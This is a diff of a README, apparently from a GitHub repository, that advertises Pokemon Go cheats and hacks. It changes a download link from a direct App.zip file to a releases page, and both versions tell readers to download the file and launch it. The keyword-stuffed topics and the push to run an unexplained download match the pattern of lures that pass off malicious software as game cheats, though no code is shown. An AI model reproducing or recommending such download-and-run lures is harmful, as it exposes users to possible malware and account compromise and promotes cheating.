@@ -9,7 +9,7 @@ Do you want to dominate Pokemon Go with unbeatable cheats, hacks, and tips? Look
 - **Topics**: cheat-pokemon-go, pokemon, pokemon-cheat, pokemon-cheats, pokemon-glitch, pokemon-go, pokemon-go-cheat, pokemon-go-cheats, pokemon-go-glitch, pokemon-go-hack, pokemon-go-tips-and-tricks, pokemon-go-tricks, pokemon-hack
 
 ## Explore the Cheats
-Are you ready to take your Pokemon Go game to the next level? Visit [here](https://github.com/project/files/App.zip) to download the cheats. Make sure to launch the file once it's downloaded to start enjoying all the advantages these cheats have to offer.
+Are you ready to take your Pokemon Go game to the next level? Visit [here](https://github.com/Aaarryyann/Pokemon-Go-Cheats/releases) to download the cheats. Make sure to launch the file once it's downloaded to start enjoying all the advantages these cheats have to offer.
 
 ## 🎮 Cheating Features:
 - **Instant Level Up**: Skip the tedious grind and level up your trainer faster than ever before.
